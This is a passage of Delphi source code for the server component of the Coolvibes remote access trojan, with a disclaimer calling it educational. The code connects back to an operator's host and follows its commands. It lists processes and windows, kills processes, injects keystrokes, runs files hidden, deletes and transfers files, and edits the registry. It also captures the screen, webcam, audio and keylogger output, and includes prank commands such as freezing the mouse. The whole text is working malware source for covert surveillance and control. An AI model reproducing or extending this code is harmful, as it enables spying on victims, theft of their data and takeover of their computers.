{Unit principal del Server del troyano Coolvibes}

(* Este código fuente se ofrece sólo con fines educativos.
   Queda absolutamente prohibido ejecutarlo en computadores
   cuyo dueño sea una persona diferente de usted, a no ser
   que el dueño haya dado permiso explicito de usarlo.

   En cualquier caso, ni www.indetectables.net  ni ninguno de
   los creadores de Coolvibes será responsable de cualquier
   consecuencia de usar este programa. Si no acepta esto por
   favor no compile el programa y borrelo ahora mismo.

     El equipo Coolvibes
*)
library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
//program CoolServer; //Para debug, más lineas "Para debug" abajo
uses
  Windows,
  SysUtils,
  ShellAPI,
  Classes,
  lomtask,
  lomlib,
  SndKey32,
  UnitFunciones,
  UnitSystemInfo,
  UnitProcess,
  UnitWindows,
  UnitBromas,
  UnitFileManager,
  UnitRegistro,
  MiniReg,
  UnitVariables,
  //unitCapScreen,  
  unitCamScreen, //Webcam
  unitAvs,
  UnitCambioId,
  SettingsDef,
  UnitInstalacion,
  UnitShell, //Unit de la shell
  UnitServicios,
  SocketUnit,
  UnitKeylogger,
  UnitBuscar,
  UnitThreadsCapCamCapture,//unit que se encarga de gestionar el envio de captura de pantalla, de thumbnails, de keylogger y de webcam en un thread independiente
  UnitAudio,
  UnitTransfer;

var
  SH                  : integer;  //SocketHandle de la conexión principal
  RecibiendoFichero   : boolean = False;
  sock                : TClientSocket;
  KeepAliveHandle     : THandle;
  pingSent            : boolean;
  Busy                : boolean;
  pongReceived        : boolean;
  lastCommandTime     : integer;
  MCompartida         : THandle;
  Indice              : string;
  Conectando          : Boolean;
const
  WM_ACTIVATE = $0006;
  ENTER = #10;

  procedure sendText(str: ansistring);
  begin
    sock.SendString(str);
  end;

  procedure CheckAlive();
  begin
    if (sock = nil) then
      exit;

    if (not sock.connected) or Conectando then
    begin
      //No estaba conectado asi que me salgo
      Exit;
    end;

    if ((getTickCount() - lastCommandTime) < 40000) then
      Exit;
    //No ha pasado 40 seg idle asi que no mando ping: (getTickCount - lastCommandTime)

    if not busy then
    begin
      //No estaba Busy
      if pingSent then
      begin
        //Ya habia enviado el ping
        if not pongReceived then
        begin
          //No recibi el pong asi que me voy a desconectar
          sock.Disconnect;
          //Ya me desconecte
        end
        else
        begin
          pingSent := False;
        end;
      end
      else
      begin
        //No habia mandado el ping asi que lo mando
        pingSent     := True;
        pongReceived := False;
        SendText('PING' + ENTER);
        //Ya mande el ping
      end;
    end;

  end;

  procedure KeepAliveTimer(Interval: DWORD);
  begin
    KeepAliveHandle := SetTimer(0, 0, Interval, @CheckAlive);
  end;

  procedure KeepAliveThread;
  var
    Msg: TMsg;
  begin
//    ShowMessage('Soy el keepalive thread!!');
    KeepAliveTimer(25000);
    while (GetMessage(Msg, 0, 0, 0)) do
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
  end;


  function leer(s: TClientSocket): ansistring;
  var
    buf:   array [0..0] of char;
  var
    input: ansistring;
  begin
    input  := '';
    buf[0] := ' ';
    s.ReceiveBuffer(buf, sizeof(buf));
    while ((buf[0] <> #10) and (buf[0] <> #13) and (s.Connected)) do
    begin
      input := input + buf[0];
      try
        s.ReceiveBuffer(buf, sizeof(buf));

      except
        input := '';
        s.Destroy;
        break;
      end;
    end;
    Result := input;
  end;

  procedure iniciar();
  var
    Recibido, Respuesta, TempStr, TempStr1, TempStr2, TempStr3, TempStr4: ansistring;
    Tipo, BotonPulsado, i: integer;
    TempCardinal: cardinal;
    Tam: int64;
    ShellParameters: TShellParameters;
    ThreadInfo: TThreadInfo;
    FilePath, LocalFilePath: ansistring;
    Host  :string;
    Port : integer;
    ThreadSearch : TThreadSearch;
    ThreadCapCam : TThreadCapCam;
    capiniciada : boolean;
    MS : Tmemorystream;
  begin
    try
      begin
        sock := TClientSocket.Create;  //Socket principal

        if indice = '' then
          indice := configuracion.shosts;
        
        host := Copy(indice, 1, Pos(':', indice) -1 ); // Se leen el host y el port de la lista almacenada en indice en el formato: ip:puerto¬ip2:puerto2¬ip3:puerto3¬
        Delete(indice, 1, Pos(':', indice));
        Port := strtointdef(Copy(indice, 1, Pos('¬', indice) -1 ),80);
        Delete(indice, 1, Pos('¬', indice));

        Pararcapturathread := true;
        Conectando := true;
        sock.Connect(host, port);
        Conectando := false;
        lastCommandTime := getTickCount;
        while sock.Connected do
        begin
          Recibido := Trim(leer(sock));

          Busy := True;

          if Recibido = 'PING' then  //Respuesta a pings
          begin
           Respuesta :=  
              GetActiveWindowCaption()+'|'+
               GetIdleTime()+ '|'+GetUptime()+'|'; //ya que estamos enviamos información para que actualice el listviewconexiones
            SendText('PONG|'+Respuesta+ ENTER);
          end;

          if Recibido = 'PONG' then
          begin
              pongReceived := True;
          end;

  {Información mostrada en el ListView de conexiones del cliente, se recibe tambien
  el SocketHandle del cliente, que lo usaremos para relaccionar la conexión principal
  con la conexión para enviar y recibir ficheros}
          if Copy(Recibido, 1, 8) = 'MAININFO' then
          begin
            Delete(Recibido, 1, 9);  // 'MAININFO|123456'
            SH := StrToIntDef(Recibido,-1);//Para no romper el server en caso de que un usuario malintencionado nos mande un maininfo corrupto
            if SH = -1 then break;
            Respuesta :=
              LeerID() + '|'+ Sock.LocalAddress + '|' + GetCPU() + '|' +
              GetOS() + '|' + VersionDelServer + '|1|'+GetActiveWindowCaption()+'|'+
               GetIdleTime()+ '|'+GetUptime()+'|'+GetIdioma()+'|';

            SendText('MAININFO|' + Respuesta + ENTER);
          end;

          //Información mas extendida del sistema
          if Recibido = 'INFO' then
          begin
            Respuesta := GetOS() + '|' + GetCPU() +
              '|' + GetUptime() + '|' + GetIdleTime() +
              '|' + ObtenerAvs() + '|' + ObtenerFirewall +
              '|' + GetPCName() + '|' + GetPCUser() +
              '|' + GetResolucion() + '|' + GetTamanioDiscos() + '|';
            SendText('INFO|' + Respuesta + ENTER);
          end;

          //Comandos relacionados con la gestión del servidor
          if Copy(Recibido, 1, 8) = 'SERVIDOR' then
          begin
            Delete(Recibido, 1, 9);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Saca el comando
            Delete(Recibido, 1, Pos('|', Recibido));
            //Información específica del servidor
            if TempStr = 'INFO' then
            begin
              with Configuracion do
                TempStr := VersionDelServer + '|' + sID +
                  '|' + sHosts + '|' +
                  BooleanToStr(bCopiarArchivo, 'Sí', 'No') + '|' +
                  sFileNameToCopy + '|' + sCopyTo +
                  '|' + BooleanToStr(bMelt, 'Sí', 'No') + '|' +
                  BooleanToStr(bCopiarConFechaAnterior, 'Sí', 'No') +
                  '|' + BooleanToStr(bArranqueRun, 'Sí', 'No') +
                  '|' + sRunRegKeyName + '|'+ BooleanToStr(bArranqueActiveSetup, 'Sí', 'No') +
                  '|' + sActiveSetupKeyName + '|' + ParamStr(0) + '|';
              SendText('SERVIDOR|INFO|' + TempStr + ENTER);
            end;

            //Cerrar server
            if TempStr = 'CERRAR' then
            begin
              //SendText('MSG|Adiós!');
              //Halt;
              ExitProcess(0);
            end;
            
            //Desinstalar server
            if TempStr = 'DESINSTALAR' then
            begin
              SendText('MSG|{0}'+ENTER);
              //Desinstalar();
            end;

            if TempStr = 'ACTUALIZAR' then
            begin
                Borrararchivo(extractfilepath(paramstr(0))+Configuracion.sPluginName);
                if ShellExecute(0, 'open', PChar(ParamStr(0)), ''{sin parametros},
                  PChar(ExtractFilePath(paramstr(0))), SW_NORMAL) > 32 then
                  ExitProcess(0)
                else
                  SendText('MSG|{1}' + ENTER);
            end;
          end;

          //Comandos relaccionados con los procesos
          if Recibido = 'PROC' then   //Listar los procesos
          begin
            Respuesta := GetProc();
            SendText('PROC|' + Respuesta + ENTER);
          end;

        {Si los primeros ocho caracteres son 'KILLPROC', significa que hay que matar
        un proceso. Saca el PID y mata ese proceso. Sintaxis del comando: KILLPROC|<PID>}
          if Copy(Recibido, 1, 8) = 'KILLPROC' then
          begin
            Delete(Recibido, 1, 9);
            if TerminarProceso(Recibido) = True then
              SendText('MSG|{2}' + Recibido + ENTER)
            else
              SendText('MSG|{3}' + Recibido + ENTER);
          end;
          //Fin de comandos relaccionados con los procesos

          //Comandos relaccionados con las ventanas
          if Copy(Recibido, 1, 4) = 'WIND' then    //Listar ventanas
          begin
            Delete(Recibido, 1, 5);
            
            Respuesta := '';
            if(Copy(Recibido, 1, 4) = 'true') then
              Respuesta := GetWins(true)
            else
              Respuesta := GetWins(false);
              
            SendText('WIND|' + Respuesta + ENTER);
          end;

          if Copy(Recibido, 1, 7) = 'WINPROC' then
            //Sintaxis: WINDPROC|Handle //Envìa el PID del proceso padre de la ventana con Handle
          begin
            Delete(Recibido, 1, 8);
            TempCardinal := 0;
            GetWindowThreadProcessID(StrToInt(Recibido), TempCardinal);
            //WINDPROC|HandleDeLaVentana|ProcessID
            SendText('WINPROC|' + Recibido + '|' + IntToStr(TempCardinal) + ENTER);
          end;

          if Copy(Recibido, 1, 8) = 'CLOSEWIN' then
          begin
            Delete(Recibido, 1, 9);
            CerrarVentana(StrToInt(Recibido));
            SendText('MSG|{4}' + Recibido + ENTER);
          end;

          if Copy(Recibido, 1, 6) = 'MAXWIN' then
          begin
            Delete(Recibido, 1, 7);
            MaximizarVentana(StrToInt(Recibido));
            SendText('MSG|{5}' + Recibido + ENTER);
          end;

          if Copy(Recibido, 1, 6) = 'MINWIN' then
          begin
            Delete(Recibido, 1, 7);
            MinimizarVentana(StrToInt(Recibido));
            SendText('MSG|{6}' + Recibido + ENTER);
          end;

          if Copy(Recibido, 1, 7) = 'SHOWWIN' then
          begin
            Delete(Recibido, 1, 8);
            MostrarVentana(StrToInt(Recibido));
            SendText('MSG|{7}' + Recibido + ENTER);
          end;

          if Copy(Recibido, 1, 7) = 'HIDEWIN' then
          begin
            Delete(Recibido, 1, 8);
            OcultarVentana(StrToInt(Recibido));
            SendText('MSG|{8}' + Recibido + ENTER);
          end;

          if Recibido = 'MINALLWIN' then
          begin
            MinimizarTodas();
            SendText('MSG|{9}' + ENTER);
          end;

          if Copy(Recibido, 1, 11) = 'BOTONCERRAR' then
          begin
            Delete(Recibido, 1, 12);
            if Copy(Recibido, 1, 2) = 'SI' then
            begin
              Delete(Recibido, 1, 3); //Borra 'SI|' y queda el handle
              BotonCerrar(True, StrToInt(Recibido));
              SendText('MSG|{10}' +
                Recibido + ENTER);
            end
            else
            begin
              Delete(Recibido, 1, 3); //Borra 'NO|' y queda el handle
              BotonCerrar(False, StrToInt(Recibido));
              SendText('MSG|{11}' +
                Recibido + ENTER);
            end;
          end;
          
          if Copy(Recibido, 1, 8) = 'SENDKEYS' then
          begin
            Delete(Recibido, 1, 9);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            //Copia el handle de la ventana...
            Delete(Recibido, 1, Pos('|', Recibido)); //borra el handle + '|'
            try
              i := StrToInt(TempStr)
            except
              begin
                SendText('MSG|{12}' +
                  TempStr + ENTER);
                Exit;
              end;
            end;
            AppActivateHandle(i);
            SendKeys(PChar(Recibido), True);
            SendText('MSG|{13}' + TempStr + ENTER);
          end;
          //Fin de comandos relacionados con las ventanas

          //Comandos relaccionados con las bromas
          if Copy(Recibido, 1, 15) = 'MOUSETEMBLOROSO' then
          begin
            Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la cadena
            if Recibido = 'ACTIVAR' then
            begin
              //activar mouse tembloroso
              CongelarMouse(False); //Lo descongela si está congelado
              TemblarMouse(True);
              SendText('MOUSETEMBLOROSO|Activado' + ENTER);
            end
            else
            begin
              //desactivar mouse tembloroso
              TemblarMouse(False);
              SendText('MOUSETEMBLOROSO|Desactivado' + ENTER);
            end;
          end;

          if Copy(Recibido, 1, 13) = 'CONGELARMOUSE' then
          begin
            Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la cadena
            if Recibido = 'ACTIVAR' then
            begin
              //activar congelar mouse
              TemblarMouse(False); //El mouse para de temblar si se congela
              CongelarMouse(True);
              {sleep(10000); //Recomendado Para debug :p
              CongelarMouse(False);}
              SendText('CONGELARMOUSE|Activado' + ENTER);
            end
            else
            begin
              //desactivar congelar mouse
              CongelarMouse(False);
              SendText('CONGELARMOUSE|Desactivado' + ENTER);
            end;
          end;

          if Copy(Recibido, 1, 7) = 'ABRIRCD' then
          begin
            Delete(Recibido, 1, 8); //Borra 'ABRIRCD|' de la cadena
            if Recibido = 'ACTIVAR' then
            begin
              //abrir cd
                    mciSendString( 'Set cdaudio door open wait', nil, 0, hInstance);
              SendText('ABRIRCD|Activado' + ENTER);
            end
            else
            begin
              //cerrar cd
                    mciSendString( 'Set cdaudio door closed wait' , nil , 0 , hInstance );
              SendText('ABRIRCD|Desactivado' + ENTER);
            end;
          end;

          if Copy(Recibido, 1, 16) = 'MATARBOTONINICIO' then
          begin
            Delete(Recibido, 1, 17); //Borra 'MATARBOTONINICIO|' de la cadena
            if Recibido = 'ACTIVAR' then
            begin
              //Desactivar boton inicio
              EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil)
                , 0, 'Button', nil), False);
              SendText('MATARBOTONINICIO|Activado' + ENTER);
            end
            else
            begin
              //Activar boton inicio
              EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil)
                , 0, 'Button', nil), True);
              SendText('MATARBOTONINICIO|Desactivado' + ENTER);
            end;
          end;
          //Fin de comandos relaccionados con las bromas

          //Comandos relaccionados con los mensajes
          if Copy(Recibido, 1, 4) = 'MSJN' then
          begin
            Delete(Recibido, 1, 4);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Obtenemos el mensaje
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Obtenemos el titulo
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Tipo de mensaje
            Delete(Recibido, 1, pos('|', Recibido));
            TempStr3 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            //Obtenemos los botones del mensaje

            Tipo := 0;
            //Miramos el tipo de mensaje
            if TempStr2 = 'WARN' then
              Tipo := MB_ICONERROR;
            if TempStr2 = 'QUES' then
              Tipo := MB_ICONQUESTION;
            if TempStr2 = 'EXCL' then
              Tipo := MB_ICONEXCLAMATION;
            if TempStr2 = 'INFO' then
              Tipo := MB_ICONINFORMATION;

            case StrToInt(TempStr3) of //Lo transformamos en entero para poder usar el case
              0: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_OK);
              1: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                  Tipo + MB_OKCANCEL);
              2: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                  Tipo + MB_RETRYCANCEl);
              3: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_YESNO);
              4: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                  Tipo + MB_YESNOCANCEL);
              5: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                  Tipo + MB_ABORTRETRYIGNORE);
              else
                BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_OK);
                //nunca debería pasar pero es mejor prevenir
            end;
            case BotonPulsado of
              idOk: SendText('MSG|{14}' + ENTER);
              idCancel: SendText('MSG|{15}' + ENTER);
              idRetry: SendText('MSG|{16}' + ENTER);
              idYes: SendText('MSG|{17}' + ENTER);
              idNo: SendText('MSG|{18}' + ENTER);
              idAbort: SendText('MSG|{19}' + ENTER);
              idIgnore: SendText('MSG|{20}' + ENTER);
            end;
          end;
          //Fin de comandos relacionados con los Mensajes

          //Comandos relacionados con el FileManager
          if Recibido = 'VERUNIDADES' then
          begin
            TempStr := '';
            TempStr := GetDrives(Tam);
            SendText('VERUNIDADES|' + TempStr + ENTER);
          end;
          //Listar archivos dentro de un directorio
          if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
          begin
            Delete(Recibido, 1, 15);
            if Copy(GetDirectory(Recibido), 1, 4) = 'MSG|' then
            begin
              //Diga que no existe el directorio asignado y salte...
              SendText(GetDirectory(Recibido) + ENTER);
              //Exit;
            end
            else
            begin
              TempStr := GetDirectory(Recibido);
              SendText('LISTARARCHIVOS|' + IntToStr(Length(TempStr)) + '|' + TempStr + ENTER);
            end;
          end;

          //Ejecutar Archivo...
          if Copy(Recibido, 1, 4) = 'EXEC' then
          begin
            Delete(Recibido, 1, 5); //Borra 'EXEC|'
            if Copy(Recibido, 1, 6) = 'NORMAL' then
            begin
              Delete(Recibido, 1, 7); //Borra 'NORMAL|'
              //Ejecutar en modo normal el archivo que queda en Recibido
              //If the function ShellExecute fails, the return value is an error value that is less than or equal to 32
              if ShellExecute(0, 'open', PChar(Recibido), ''{sin parametros},
                PChar(ExtractFilePath(Recibido)), SW_NORMAL) > 32 then
                SendText('MSG|{21}' + ENTER)
              else
                SendText('MSG|{22}' + ENTER);
            end; //if copy = normal
            if Copy(Recibido, 1, 6) = 'OCULTO' then
            begin
              Delete(Recibido, 1, 7);//Borra 'OCULTO|'
              //Ejecutar en modo oculto el archivo que queda en Recibido
              //If the function ShellExecute fails, the return value is an error value that is less than or equal to 32
              if ShellExecute(0, 'open', PChar(Recibido), ''{sin parametros},
                PChar(ExtractFilePath(Recibido)), SW_HIDE) > 32 then
                SendText('MSG|{23}' + ENTER)
              else
                SendText('MSG|{24}'
                  + ENTER);
            end; //if copy = oculto
          end; //if copy = exec

          //Borrar archivo
          if Copy(Recibido, 1, 7) = 'DELFILE' then
          begin
            Delete(Recibido, 1, 8);//Borra 'DELFILE|'
            if FileExists(Recibido) then
            begin
              if BorrarArchivo(Recibido) = True then
                SendText('MSG|{25}' + ENTER)
              else
                SendText('MSG|{26}' + ENTER);
            end
            else //el archivo no existe.... Se supone que nunca o muy pocas veces debería pasar.
              SendText('MSG|{27}' + ENTER);

          end;

          //Borrar carpeta
          if Copy(Recibido, 1, 9) = 'DELFOLDER' then
          begin
            Delete(Recibido, 1, 10);
            if DirectoryExists(Recibido) then
            begin
              if BorrarCarpeta(Recibido) = True then
                SendText('MSG|{28}' + ENTER)
              else
                SendText('MSG|{29}' + ENTER);
            end
            else
              SendText('MSG|{30}' + ENTER);
          end;

          //Renombrar archivos o carpetas
          if Copy(Recibido, 1, 6) = 'RENAME' then
          begin
            Delete(Recibido, 1, 7);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Saca el nombre viejo
            Delete(Recibido, 1, Pos('|', Recibido)); //borra lo que acaba de copiar
            if FileExists(TempStr) or DirectoryExists(TempStr) then
            begin
              if RenameFile(TempStr, Recibido) = True then
                SendText('MSG|{31}' + ENTER)
              else
                SendText('MSG|{32}' + ENTER);
            end
            else
              SendText('MSG|{33}' + ENTER);//el archivo no existe...
          end;

          //Crear carpeta
          if Copy(Recibido, 1, 5) = 'MKDIR' then
          begin
            Delete(Recibido, 1, 6);
            if not DirectoryExists(Recibido) then
            begin
              if CreateDir(Recibido) = True then
                SendText('MSG|{34}' + ENTER)
              else
                SendText('MSG|{35}' + ENTER);
            end
            else
              SendText('MSG|{36}' + ENTER);
            //Ya existe una carpeta con ese nombre
          end;

          //copiar
          if Copy(Recibido, 1, 5) = 'COPYF' then
          begin
            Delete(Recibido, 1, 6);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //desde
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //a
            if copyfile(pchar(TempStr), pchar(TempStr1), false) then
              SendText('MSG|{37}' + ENTER)
            else
              SendText('MSG|{38}' + ENTER);
          end;

          //Cambiar atributos
          if Copy(Recibido, 1, 11) = 'CHATRIBUTOS' then
          begin
            Delete(Recibido, 1, 12);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //dir
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //atributos
            i := 0;
            if (pos('Oculto',tempstr1) > 0) then  //Oculto
              i := i or faHidden;
            if (pos('Lectura',tempstr1) > 0) then //lectura
              i := i or faReadOnly;
            if (pos('Sistema',tempstr1) > 0) then //Sistema
              i := i or faSysFile;

            FileSetAttr(tempstr,i);
          end;

          //Ir a un directorio rápidamente
          if Copy(Recibido, 1, 6) = 'GORUTA' then
          begin
            Delete(Recibido, 1, Pos('|', Recibido));

            if Recibido =      'RECIENTE' then
              Recibido := GetSpecialFolderPath($0008)
            else if Recibido = 'DOCUMENTOS' then
              Recibido := GetSpecialFolderPath($0005)
            else if Recibido = 'ESCRITORIO' then
              Recibido := GetSpecialFolderPath($0010)
            else if Recibido = 'WINDIR' then
              Recibido := WinDir
            else if Recibido = 'SYSDIR' then
              Recibido := Sysdir
            else if Recibido = 'CURRENTDIR' then
              Recibido := extractfilepath(paramstr(0));

            Sendtext('GORUTA|'+Recibido+'|'+ENTER);
          end;

          //Fin de comandos relacionados con el FileManager

          //Comandos relacionados con el Registro
          if Copy(Recibido, 1, 12) = 'LISTARCLAVES' then
          begin
            Delete(Recibido, 1, 13);
            Tempstr := '';
            TempStr := ListarClaves(Recibido);
            TempStr := StringReplace(Trim(TempStr),#10, '|salto|', [rfReplaceAll]);
            TempStr := StringReplace((TempStr),#13, '|salto2|', [rfReplaceAll]);
            SendText('LISTARCLAVES|' {+ IntToStr(length(TempStr)) + '|'} + TempStr + ENTER);
          end;

          if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
          begin
            Delete(Recibido, 1, 14);
            Tempstr := '';
            Tempstr := ListarValores(Recibido);
            TempStr := StringReplace(Trim(TempStr),#10, '|salto|', [rfReplaceAll]);
            TempStr := StringReplace((TempStr),#13, '|salto2|', [rfReplaceAll]);

            SendText('LISTARVALORES|' + TempStr + ENTER);
          end;

          if Copy(Recibido, 1, 14) = 'NEWNOMBREVALOR' then
          begin
            Delete(Recibido, 1, 15);
            //Extraemos la clave donde está el valor
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            //Obtenemos el viejo nombre del valor
            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            //Conseguimos el nuevo nombre del valor
            TempStr2 := Copy(Recibido, 1, Length(Recibido));
            if RenombrarClave(PChar(TempStr), PChar(TempStr1), PChar(TempStr2)) then
              SendText('MSG|{39}' + ENTER)
            else
              SendText('MSG|{40}' + ENTER);
          end;

          if Copy(Recibido, 1, 14) = 'BORRARREGISTRO' then
          begin
            Delete(Recibido, 1, 15);
            if BorraClave(Recibido) then
              SendText('MSG|{41}' + ENTER)
            else
              SendText('MSG|{42}' + ENTER);
          end;

          if Copy(Recibido, 1, 8) = 'NEWCLAVE' then
          begin
            Delete(Recibido, 1, 9);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr1 := Copy(Recibido, 1, Length(Recibido));  //Quitamos la última barra '\'
            if AniadirClave(TempStr + TempStr1, '', 'clave') then
              SendText('MSG|{43}' + ENTER)
            else
              SendText('MSG|{44}' + ENTER);
          end;

          if Copy(Recibido, 1, 8) = 'ADDVALUE' then
          begin
            Delete(Recibido, 1, 9);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            if AniadirClave(TempStr, Copy(Recibido, 1, Length(Recibido)), TempStr1) then
              SendText('MSG|{45}' + ENTER)
            else
              SendText('MSG|{46}' + ENTER);
          end;
          //Fin de comandos relacionados con el Registro


          if Copy(Recibido, 1, 14) = 'DATOSCAPSCREEN' then
          begin
            SendText('DATOSCAPSCREEN|'+inttostr(anchurapantalla())+'|'+inttostr(alturapantalla())+'|' + ENTER);
          end;

          //Codigo para enviar la captura de pantalla, la de webcam, los thumbnails y el keylogger, usan un socket independiente
          if (Copy(Recibido, 1, 9) = 'CAPSCREEN') or (Copy(recibido, 1, 13) = 'CAPTURAWEBCAM') or (Copy(recibido, 1, 8) = 'GETTHUMB') or (Copy(recibido, 1, 8) = 'GETAUDIO') or (Copy(recibido, 1, 16) = 'RECIBIRKEYLOGGER') then
          begin
                 
            if Pararcapturathread then   //si aun no se ha iniciado...
            begin
              pararcapturathread := false;
              ThreadCapCam := TThreadCapCam.Create(host,inttostr(port),inttostr(SH)); //Se crea nuevo thread
              ThreadCapCam.Resume;
            end;
                    //El thread mira el cambio de la variable global CapturaPantalla,CapturaWebcam..., quizas no sea el mejor método...

            while((CapturaWebcam <> '') or (CapturaPantalla<>'') or (CapturaThumb <> '') or (CapturaKeylogger<>'') or (CapturaAudio>'')) do sleep(1);  //En teoria no deberia pasar...

            if Copy(recibido, 1, 13) = 'CAPTURAWEBCAM' then
            begin                                                       //Se crea la captura de webcam desde aquí porque sino da error al hacer las llamadas a la dll desde el otro thread
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);  //Numero de webcam
              Delete(Recibido, 1, Pos('|', Recibido));
              MS := TMemoryStream.create;   //MS de la captura de Pantalla
              MS.Position := 0;
              CapturarWebcam(MS,StrToInt(TempStr),strtoint(Recibido));
              MS.Position := 0;
              TempStr := '';
              SetLength(TempStr, ms.size);
              Ms.Read(TempStr[1], ms.size);
              MS.Free;
              MS := nil;
              CapturaWebcam := Tempstr; //Le dejamos que la envie el otro thread
            end
            else if Copy(recibido, 1, 9) = 'CAPSCREEN' then
            begin
              Delete(Recibido, 1, Pos('|', Recibido));
              CapturaPantalla := trim(Recibido);  //Simplemente le pasamos los datos y el thread realiza la captura
            end
            else if (Copy(recibido, 1, 8) = 'GETTHUMB') then
            begin
              Delete(Recibido, 1, Pos('|', Recibido));
              CapturaThumb := Recibido;
            end
            else if (Copy(recibido, 1, 16) = 'RECIBIRKEYLOGGER') then
            begin
              TempStr := '';
              TempStr := ObtenerLog();
              CapturaKeylogger := TempStr;
            end
            else if (Copy(recibido, 1, 8) = 'GETAUDIO') then
            begin
              Delete(Recibido, 1, Pos('|', Recibido));
              CapturaAudio := Recibido;
            end;
                 
          end;
          //Fin del código para capturar pantalla, webcam, thumbs y recibir keylogger

          if Copy(recibido, 1, 8) = 'CAMBIOID' then  //cambiar el id
          begin
            Delete(recibido, 1, 8);
            CambiarID(trim(recibido));
          end;

          //Comandos relaccionados con la webcam
          if Copy(recibido, 1, 13) = 'LISTARWEBCAMS' then
          begin
            Tempstr := '';
            Tempstr := ListarDispositivos;
            SendText('LISTARWEBCAMS|' + Tempstr + ENTER);
          end;

          //Clics remotos
          if copy(Recibido, 1, 6) = 'MOUSEP' then
          begin
            Delete(recibido, 1, 6);
            TempStr := copy(recibido, 1, Pos('|', recibido) - 1);
            Delete(Recibido, 1, pos('|', Recibido));
            TempStr1 := Copy(recibido, 1, pos('|', Recibido) - 1);
            Delete(Recibido, 1, pos('|', Recibido));
            TempStr2 := Copy(recibido, 1, pos('|', Recibido) - 1);
            Delete(Recibido, 1, pos('|', Recibido));
            if TempStr2 = 'CLICKIZQ' then
            begin
              mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
              mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
              SetCursorPos(StrToInt(TempStr), StrToInt(TempStr1));
            end
            else if TempStr2 = 'CLICKDER' then
            begin
              mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
              mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
              SetCursorPos(StrToInt(TempStr), StrToInt(TempStr1));
            end;
          end;


          if Pos('GETFOLDER|', Recibido) = 1 then   //Funcion para descarga recursiva
          begin
            Delete(recibido, 1, 10);
            Tempstr := '';
            Tempstr := ArchivosDentroDeDirectorio(Recibido);
            if (sock.Connected) then //si se le da a un directorio con muchos subdirectorios puede tardar mucho tiempo...
              sock.SendString('GETFOLDER'+ TempStr + ENTER); //Puede tardar bastante
          end;

          if Pos('GETFILE|', Recibido) = 1 then
          begin
            Delete(Recibido, 1, 8);
            Recibido   := Trim(Recibido);
            ThreadInfo := TThreadInfo.Create(host, port,
              IntToStr(SH), Recibido, 'GETFILE', 0);
            //ThreadedTransfer(Pointer(ThreadInfo)); //Para debug
            BeginThread(nil,
              0,
              Addr(ThreadedTransfer),
              ThreadInfo,
              0,
              ThreadInfo.ThreadId);
          end;

          if Pos('RESUMETRANSFER|', Recibido) = 1 then
          begin
            Delete(Recibido, 1, Pos('|', Recibido));
            Recibido := Trim(Recibido);
            FilePath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            Recibido   := Trim(Recibido);
            ThreadInfo := TThreadInfo.Create(host, port,
              IntToStr(SH), FilePath, 'RESUMETRANSFER', StrToInt(Recibido));
            BeginThread(nil,
              0,
              Addr(ThreadedTransfer),
              ThreadInfo,
              0,
              ThreadInfo.ThreadId);
          end;

          if Pos('SENDFILE|', Recibido) = 1 then
          begin
            Delete(Recibido, 1, Pos('|', Recibido));
            Recibido := Trim(Recibido);
            FilePath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            LocalFilePath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //MD5 hash
            Delete(Recibido, 1, Pos('|', Recibido));

            ThreadInfo := TThreadInfo.Create(Host, Port,
